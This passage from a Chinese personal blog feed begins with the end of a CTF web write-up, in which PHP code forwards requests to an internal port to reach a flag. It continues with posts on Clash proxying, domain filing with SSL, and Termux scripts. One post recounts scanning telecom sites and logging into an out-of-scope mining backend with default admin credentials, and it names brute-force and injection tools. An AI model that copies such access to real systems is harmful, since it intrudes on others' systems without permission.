class="hljs-subst">$v</span>&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">header_callback</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseHeader</span>(<span class="hljs-params"><span class="hljs-variable">$sResponse</span></span>)</span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>)=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>,<span class="hljs-variable">$sResponse</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="hljs-variable">$sResponse</span>))&#123;<br>        <span class="hljs-variable">$ret</span>=<span class="hljs-title function_ invoke__">parseHeader</span>(<span class="hljs-variable">$sResponse</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">120</span>);<br><span class="hljs-variable">$headers</span>=<span class="hljs-title function_ invoke__">get_client_header</span>();<br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">61416</span>;<br><span class="hljs-variable">$errno</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$errstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$timeout</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;/index.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;?&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>&#125;;<br><br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br>    <span class="hljs-variable">$post_data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$method</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot; HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: &quot;</span>.<span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$port</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-Type: &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-length:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>);<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">$post_data</span>;<br><br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>))&#123;<br>    <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$row</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$response</span>, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br><span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$response</span>, <span class="hljs-variable">$pos</span>+<span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br></code></pre></td></tr></table></figure><p>我们连接这个文件后，打开模拟终端后就能够get flag啦</p><p><img src="https://upyun.wuuconix.link/image-20210914235702471.png" alt="flag" /></p><p>当然也可以不用插件，但是那种方法太难了，我无法理解2333，就不写了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu Server利用Clash实现git代理</title>
    <link href="/2021/08/14/clash-dashboard/"/>
    <url>/2021/08/14/clash-dashboard/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-YCPVlsNN" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1844193289" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>四月份vaala向我分享了它的科学上网小助手，利用的是clash。界面十分漂亮。这个暑假我也自己购买了国外的vps，实现了自己的节点。但是我能够使用代理一直都只是在Windows和Android，在github上你很容里能找到Clash For Windows和Clash For Android，但是如何在Linux上利用Clash实现代理呢？</p><p>另一方面，我在实验室主机上每次写完博客，试图git push的时候，都是卡的要死，都是看运气，也让我萌生了在Ubuntu Server实现代理的迫切愿望。</p><p>昨天花了一点时间终于实现了在Ubunutu Server【不是Desktop版，没有图形化界面，只有终端】实现git代理。</p><h2 id="主要过程"><a class="markdownIt-Anchor" href="#主要过程"></a> 主要过程</h2><ol><li><p>首先吐槽一下作者的<a href="https://github.com/Dreamacro/clash/wiki">github wiki</a>。明明是一个 <code>優れました Chinese</code>，却不给个中文文档。这就算了，面向国际化，能够理解。但是文档也是写的神秘莫测，怕别人看懂似的，从头到尾没有介绍清楚一个完整的使用方法，而写了一堆奇怪的东西。</p></li><li><p>在Ubuntu Server上实现Clash代理，我们不可或缺的是一个网页版的客户端，因为没有可视化界面，那真是虚空代理了，都不知道自己到底代上没。</p></li><li><p>作者的github放出了许多<a href="https://github.com/Dreamacro/clash/releases/tag/v1.6.5">release</a>。但是我们一个也用不上，我们用最简单的docker实现代理。拉取以下两个镜像并分别生成容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull dreamacro/clash<br>docker pull haishanh/yacd<br>docker run -d --name=clash -v <span class="hljs-string">&quot;<span class="hljs-variable">$PWD</span>/config.yaml:/root/.config/clash/config.yaml&quot;</span> -p <span class="hljs-string">&quot;7890:7890&quot;</span> -p <span class="hljs-string">&quot;9090:9090&quot;</span> --restart=unless-stopped dreamacro/clash<br>docker run -p 1234:80 -d --name clash-dashboard haishanh/yacd<br></code></pre></td></tr></table></figure></li><li><p>解释一下，<a href="https://hub.docker.com/r/dreamacro/clash">dreamacro/clash</a>是clash核心，里面运行着clash可执行文件。我们需要在它的容器里放一个config.yaml，即clash的配置文件，生成容器的时候我们和主机的<code>$PWD/config.yaml</code>进行了绑定。 <a href="https://hub.docker.com/r/haishanh/yacd">haishanh/yacd</a>是clash dashboard，haishanh做的第三方网页客户端，比原版ui更加漂亮，虽然我都没有找到原本的dashboard在哪，<s>作者写的文档太拉了</s>。</p></li><li><p>这里要特别注意，我们的config.yaml里有两个项特别重要的配置。</p><p><img src="https://upyun.wuuconix.link/image-20210814214034471.png" alt="config.yml" /></p><p>这个<code>external-controller</code>就是相当于额外的一个api，这个9090端口之后的dashboard会用到，而且需要设置为0.0.0.0，保证dashboard容器能够访问到。</p><p>然后这个allow-lan必须设置为true。allow-lan按我的理解就是看你局域网里的其他应用能不能访问你的7890端口，如果设置为false是无法实现代理的，所以要代理就得全程开着。</p></li><li><p>确保config.yaml没错并且运行完以上四个命令后，就可以进dashboard了，url就是的<code>主机ip:1234</code></p><p>一开始会让你选择服务的ip和端口。</p><p><img src="https://upyun.wuuconix.link/image-20210814214513267.png" alt="选择服务地址" /></p><p>默认的<code>http://127.0.0.1:9090</code>是不可能成功进去的，因为这个127.0.0.1代表的是dashboard的本地，而真正的clash服务是在令一个容器内，所以我们真正的地址应该是<code>主机ip:9090</code>。<s>一开始在这里卡了好久</s></p></li><li><p>然后就能进入图形化界面啦。</p><p><img src="https://upyun.wuuconix.link/image-20210814214011686.png" alt="界面1" /></p><p><img src="https://upyun.wuuconix.link/image-20210814214810283.png" alt="界面2" /></p></li><li><p>然后我们可以利用 <code>curl -x</code>来检测代理是否成功，尝试利用代理访问谷歌。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x http://127.0.0.1:7890 https://www.google.com.hk/<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210814215743017.png" alt="curl测试" /></p><p>如果返回结果了，那么说明你的clash成功了！</p></li><li><p>那怎么给git设置代理呢？十分简单，只需要要终端中输入以下两条命令，之后的git push就不怕卡住啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global http.proxy http://127.0.0.1:7890<br>git config --global https.proxy https://127.0.0.1:7890<br></code></pre></td></tr></table></figure></li></ol><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>这次终于是实现了Ubuntu Server里的代理，过程较为曲折，结果十分成功。</p><p>这里再打个广告，我的科学上网小助手更新了一个永久节点，但是由于内容比较敏感，所以文章加密了。迫切科学上网的同学可以联系我获取<a href="https://wuuconix.link/2021/08/06/clash/">文章</a>密码。延续无私奉献的黄金精神2333</p><img src="https://upyun.wuuconix.link/image-20210814220422826.png" alt="自建科学上网小助手文章" style="zoom:67%;" /><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ubuntu server</tag>
      
      <tag>clash</tag>
      
      <tag>dashboard</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域名备案 &amp; SSL证书 &amp; https</title>
    <link href="/2021/08/13/domain/"/>
    <url>/2021/08/13/domain/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-QcwnbpJM" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="27566958" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>由于之前的域名<code>wuuconix.xyz</code>是在国外域名厂商<a href="https://www.namesilo.com/">NameSilo</a>手里买的，而我的服务器是阿里云。任何域名绑国内的服务器，80端口都是需要备案的，不备案就会有以下的提示。</p><p align="center"><img src="https://upyun.wuuconix.link/image-20210813213439721.png" alt="提示备案" style="zoom: 67%;" /></p><p>但是国外的域名又无法备案。所以很长时间里我的所有服务都加上了8000端口。显得非常难看。</p><p>最后实在受不了了，我在8月6日晚22点在阿里云<a href="https://wanwang.aliyun.com/domain/">万网</a>花了17大洋购买了<code>wuuconix.link</code>域名。以下我来介绍一下购买域名后需要干的一些事。</p><h2 id="域名备案主要过程"><a class="markdownIt-Anchor" href="#域名备案主要过程"></a> 域名备案主要过程</h2><ol><li>购买域名后是不能直接解析的，状态可能为<code>注册局暂停解析</code>，所以购买域名后需要马上进行实名认证。当时我记得我晚上十点买域名，然后迅速进行实名认证，大概两个小时候之后就完成了。</li><li>但是实名认证成功需要一定时间才能传到注册局，也就是虽然你实名认证成功了，但是还是<code>注册局暂停解析</code>的状态，我这个状态大概持续了一天半。</li><li>成功解析后，就能开始备案了。填好自己的信息，注意居住地一定要和身份证的地址一致，不然之后他会要求你出示居住地的居住证（谁tm有这玩意儿2333）</li><li>备案信息填好之后大概第二天，就会有一个阿里云的电话号码打过来，向你验证一下信息，大概就是报一下身份证号和网站域名。这是阿里云的初审。</li><li>阿里云初审通过后，就会报备上级进行审查，这时候你就只需要等就行了，大概等4天左右。</li><li>所以你购买域名后全速前进的话，大概五六天就能完成备案。时间还是挺快的。看网上前辈们的经历，都要等到半个月。</li></ol><h2 id="ssl证书的获取"><a class="markdownIt-Anchor" href="#ssl证书的获取"></a> SSL证书的获取</h2><p>推荐使用<a href="https://letsencrypt.osfipin.com/">来此加密</a>进行免费的SSL证书获取。过程十分简单，大概就是让你设置一个TXT域名解析证明这个域名是你的，然后过一会儿等它验证完，你就可以下载证书了。网站下载的文件夹里包含以下文件。</p><p><img src="https://upyun.wuuconix.link/image-20210813214926696.png" alt="证书文件" /></p><h2 id="nginx将http重定向到https"><a class="markdownIt-Anchor" href="#nginx将http重定向到https"></a> nginx将http重定向到https</h2><p>我现在的所有服务其实都开在实验室的小主机上面，给大家康康我的docker容器们。</p><p><img src="https://upyun.wuuconix.link/image-20210813215138072.png" alt="docker容器们" /></p><p>然后利用frp内网穿透将服务通过阿里云服务器向外提供服务。</p><p><img src="https://upyun.wuuconix.link/image-20210813215306645.png" alt="frpc.ini" /></p><p>然后怎么把这些原本都是http的服务变成https的呢？实际上是利用阿里云服务器的nginx做了一层反向代理和重定向。</p><p><img src="https://upyun.wuuconix.link/image-20210813215524340.png" alt="nginx配置" /></p><p>从nginx的配置文件中可以看出，<code>https://wuuconix.link</code>实际上被反向代理到了<code>http://wuuconix.link:8000</code>，这个8000端口其实就是frp</p><p>然后对普通的<code>http://wuuconix.link</code>进行重定向，重定向到了<code>https://wuuconix.link</code>。</p><p>也就是说实际上提供服务器的就是<code>http://wuuconix.link:8000</code>。但是经过一番操作，用户不再需要输入端口，网站访问变得更加优美。从这里也可以体现出反向代理的强大。</p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>博客的链接终于变得正常啦！</p><p>试了一下，https的链接能够在qq聊天记录里直接打开了，之前由于http的原因被腾讯拦截了。之后和同学分享网址更加方便啦！🎉</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>域名</tag>
      
      <tag>SSL证书</tag>
      
      <tag>反向代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>挖洞初体验</title>
    <link href="/2021/08/11/hole/"/>
    <url>/2021/08/11/hole/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-YFOFpSyd" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1343799783" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>这个暑假没有回家，原因是因为实验室有某个神秘项目。其实也不神秘，就是让你去挖三大运营商网站的漏洞，这个网站不光是总站，还可以是分公司的站，比如说<code>中国移动通信集团新疆有限公司伊犁州分公司</code>。这个项目非常幸运地和vaala一起做，在过程中vaala帮助了我很多，非常感谢。</p><h2 id="大体流程"><a class="markdownIt-Anchor" href="#大体流程"></a> 大体流程</h2><ol><li><p>首先我们需要确定以一个目标，我们可以在天眼查<a href="https://www.tianyancha.com/">天眼查</a>中输入关键字。查看具体的企业名称。</p><p><img src="https://upyun.wuuconix.link/image-20210811130412259.png" alt="天眼查" /></p></li><li><p>然后在<a href="https://beian.miit.gov.cn/">备案网</a>上查询该公司有哪些网站。</p><img src="https://upyun.wuuconix.link/image-20210811130707755.png" alt="备案网" style="zoom: 80%;" /></li><li><p>然后我们需要根据网址得到网站的IP，这里可以手动ping一下，可以借助<a href="http://mip.chinaz.com/">在线网站</a></p><p><img src="https://upyun.wuuconix.link/image-20210811130917127.png" alt="ip" /></p></li><li><p>然后就需要根据ip对网站进行扫描。这里用到了一款强大的网络控件安全引擎<a href="https://classic.fofa.so/">fofa</a>。输入ip即可。</p><img src="https://upyun.wuuconix.link/image-20210811131143820.png" alt="fofa"  /><p>fofa能够将ip下开放的端口直接扫出来，十分强大。因为有些网站是不开放80端口的，我们直接去访问域名是访问不到服务的，而有了fofa，该机器开设的服务我们将尽收眼底。</p></li><li><p>当我们确定了某个端口的服务后就可以开始淦了，下面我介绍一下我现在在用的扫描工具。</p></li></ol><h2 id="扫描工具"><a class="markdownIt-Anchor" href="#扫描工具"></a> 扫描工具</h2><ol><li>首先上面的<a href="https://classic.fofa.so/">fofa</a>肯定是一个很重要的端口扫描工具。</li><li><a href="https://github.com/maurosoria/dirsearch">dirsearch</a>，这款工具平常在ctf比赛时也很常用，是用来扫目录的。</li><li><a href="https://github.com/chaitin/xray">xray</a>，长亭出的一款扫描工具。</li><li><a href="https://cn.gobies.org/">goby</a>。fofa作者的一款力作，界面美观，功能强大，可以扫ip C端，虽然这次项目不让扫，如果真让扫，我觉得一天至少得发现几十个洞。</li><li><a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a>。我在vulvtr上安了用来爆破ssh密码。</li><li><a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a>。用来检测某网站是否存在sql注入，虽然我就没成功过2333</li></ol><h2 id="我的成果"><a class="markdownIt-Anchor" href="#我的成果"></a> 我的成果</h2><ol><li><p>发现了某移动站使用了某CMS，配合上<a href="http://wy.zone.ci/">乌云</a>上大佬们的payload，进入了后台管理界面，并且可以进入文件上传界面。</p></li><li><p>第一次用goby的时候，不小心设置成C端扫描了，扫了一会儿我发现了问题的严重性，因为我发现一下子有很多ip。我跟vaala分享了这恐怖的一瞬间，vaala说没事，还指出扫出来的两个ip很有可能是关键节点，因为它们都开启了telnet服务。我一点进去，还真可以，有一个矿场的后台登录界面。我顺手输了两个admin，竟然直接进入了，幸福就是来着这么突然。</p><p><img src="https://upyun.wuuconix.link/image-20210811134818259.png" alt="chat-1" /></p><p>内部矿井的信息一览无余，由于涉密，这里就不放出来了。</p></li></ol><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>经过这次经历，我对漏洞的查找有了初步的认识，对各种工具的使用也比较熟悉了。</p><p>也非常幸运地找到了人生第一个漏洞，完成了一开始和vaala夸下的海口。</p><p><img src="https://upyun.wuuconix.link/image-20210811135345945.png" alt="chat-2" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>挖洞</tag>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用termux-api和at指令实现可视化定时自动关闭wifi和蓝牙</title>
    <link href="/2021/08/09/termux-api/"/>
    <url>/2021/08/09/termux-api/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-bqagcGyi" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="559760" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><blockquote><p>所谓需求是人类进步的阶梯。</p></blockquote><p>昨天晚上<s>也就是今天凌晨233</s>我漫无目的地刷着youtube，享受着科学上网带来的方便。突然直接按刷到了一个ASMR的视频，我听着感觉非常舒服，不会再胡思乱想了，很快就能进入入睡状态。遂决定带着耳机睡觉。平板便亮着屏幕放一边了。</p><p>过了一会儿，我突然意识到这可不行，平板一直亮着那我一起来不就没电了！但是屏幕不亮的话浏览器又不能正常运行。所以我马上坐起来，着手写一个关屏幕脚本。以下是我在凌晨很快写出来的临时脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sleep</span> 10000 <span class="hljs-comment">#睡眠10000s，因为那个视频大概3个小时</span><br>sudo input keyevent 223<br></code></pre></td></tr></table></figure><p>好吧，这个临时脚本low爆了，但是也确实实现了功能，我一早起来屏幕是灭的，电量是充足的，youtube的视频也被定格在了2小时40几分钟。</p><p>但是它的问题很严重。</p><ol><li>不能后台运行</li><li>只关闭了屏幕，wifi和蓝牙没有关，依然耗电。</li></ol><p>所以我今早一起来便开始研究改进方法，希望实现优雅的定时关屏幕、关wifi、关蓝牙。</p><h2 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h2><p>利用termux-api这个强大的工具，上午研究它的时候发现了一些非常好玩的用法，这里举两个例子。<s>老杜看到了不要捶我</s></p><ol><li>提示框。一句简单的termux-dialog命令就能调出安卓自带的提示框，而且种类繁多，非常牛逼。</li></ol><p><img src="https://upyun.wuuconix.link/image-20210809150303600.png" alt="termux-dialog" /></p><div align=center><img src="https://upyun.wuuconix.link/image-20210809173725395.png" alt="老杜是以下那一种？" style="zoom: 67%;" /></div><ol start="2"><li>可以直接把文字用谷歌的tts <code>TextToSpeech</code>念出来，至于音色嘛，就是大家熟悉的营销号2333。</li></ol><p><img src="https://upyun.wuuconix.link/image-20210809154123266.png" alt="termux-tts-speak" /></p><p>以下为珍贵的音频片段</p><!--         <div id="aplayer-QYesToAi" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-QYesToAi"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "营销号",              author: "wuuconix",              url: "https://link.jscdn.cn/sharepoint/aHR0cHM6Ly9zdHVoaXRlZHVjbi1teS5zaGFyZXBvaW50LmNvbS86dTovZy9wZXJzb25hbC8yMTkwNDAwNjAxX3N0dV9oaXRfZWR1X2NuL0VWTTBIN000VVZKSmhqakd2SUlnUThJQjZ4TTdsRm5WLVNZTXhEMWhzTmtEN1E_ZT1jeUM3aWw.wav,",              pic: "https://upyun.wuuconix.link/image-20210809162039109.png",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script> --><div align='center'><audio controls>  <source src="https://uconix-my.sharepoint.com/:u:/g/personal/wu_uconix_onmicrosoft_com/EQKlQkXT6zdIoYrjZE8vIq0B098cs6fW9LT_sTM5R_uO9g?download=1" type="audio/wav"></audio></div><p> </p><p>ok，我们了解到了termux-api的强大功能，在本次实践中的一个主要动作就是确定时间，因为我要根据ASMR视频的时长来确定什么时候关闭屏幕，这里我用到了termux-api中的 termux-dialog time，一运行就会弹出系统自带的时间选择器。</p><div align=center><img src="https://upyun.wuuconix.link/image-20210809173426024.png" alt="时间选择器" style="zoom: 67%;" /></div><p>选择后会返回一个json格式的数据。</p><p><img src="https://upyun.wuuconix.link/image-20210809173510893.png" alt="json" /></p><p>我们可以利用<code>jq</code>这个命令来处理json数据，以下命令就能获得返回的时间</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">termux-dialog time | jq .text<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210809173810443.png" alt="time" /></p><p>获得了时间，我们得需要一个方法来让termux到了时间自动执行屏幕、wifi、蓝牙的脚本。这里直接先给出<code>switchoff.sh</code>脚本。利用了svc这个安卓自带的命令来关闭wifi和蓝牙，利用input keyevent 223来熄屏幕，十分简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo svc wifi <span class="hljs-built_in">disable</span><br>sudo svc bluetooth <span class="hljs-built_in">disable</span><br>sudo input keyevent 223<br></code></pre></td></tr></table></figure><p>定时运行脚本，之前接触过crontab这个强大的命令，但是crontab适合那种需要重复执行的脚本，而我这个关屏幕只需要运行一次，不太合适。</p><p>经过我的搜索，我发现了一个完美符合我预期的命令，<code>at</code>。以下给出<code>smartswitchoff.sh</code>脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">time=`termux-dialog time | jq .text | awk <span class="hljs-string">&#x27;&#123;print substr($1,2,5)&#125;&#x27;</span>`<span class="hljs-comment">#获得用户输入的时间</span><br>at -f ~/.shortcuts/switchoff.sh <span class="hljs-string">&quot;<span class="hljs-variable">$time</span>&quot;</span> <span class="hljs-comment">#定时执行switchoff.sh</span><br>termux-toast -g top <span class="hljs-string">&quot;pad将会在<span class="hljs-variable">$time</span>关闭屏幕、wifi与蓝牙&quot;</span> <span class="hljs-comment">#以下三行为提示，自上而下，十分震撼2333</span><br>termux-toast -g middle <span class="hljs-string">&quot;pad将会在<span class="hljs-variable">$time</span>关闭屏幕、wifi与蓝牙&quot;</span><br>termux-toast -g bottom <span class="hljs-string">&quot;pad将会在<span class="hljs-variable">$time</span>关闭屏幕、wifi与蓝牙&quot;</span><br></code></pre></td></tr></table></figure><p>以下为演示视频<br />视频中利用了<code>termux widget</code>这个插件，将<code>~/.shortcuts</code>这个文件夹下的shell脚本可以通过桌面小控件的方式放在桌面上，实现点击运行。运行后我将switchoff时间设置在了下一分钟，点击确定后，从上至下的提示文字闪过。最后到达下一分钟，wifi按钮和蓝牙按钮依次点灭。最后屏幕熄灭。一套动作行云流水，十分优雅。<s>完了，吹过了</s></p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=462217549&bvid=BV1qL411E7As&cid=385518465&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>前几天那个adb命令打开app那篇博客里嘲讽了一下termux，这里我对termux郑重道歉。termux绝对是安卓端最强终端！</p><p>之前我对termux不屑的原因是因为我以为在termux里不能使用安卓自带的命令。而大家也看到了，我在今天的脚本里多次用到了安卓命令，比如<code>svc</code>、<code>input keyevent</code>等等，而这些只需要在termux里进入root用户就可以用，简直无敌。</p><p>今天也是见证了termux-api的强大，几句命令就实现了可视化界面交互体验，有一种开发app的感觉（</p><p>给大家炫耀一下我的termux全家桶（</p><p><img src="https://upyun.wuuconix.link/image-20210809180823586.png" alt="termux全家桶" /></p><p>今天可以安心听着ASMR睡觉啦！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>shell</tag>
      
      <tag>android</tag>
      
      <tag>termux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自建个人科学上网平台</title>
    <link href="/2021/08/06/clash/"/>
    <url>/2021/08/06/clash/</url>
    
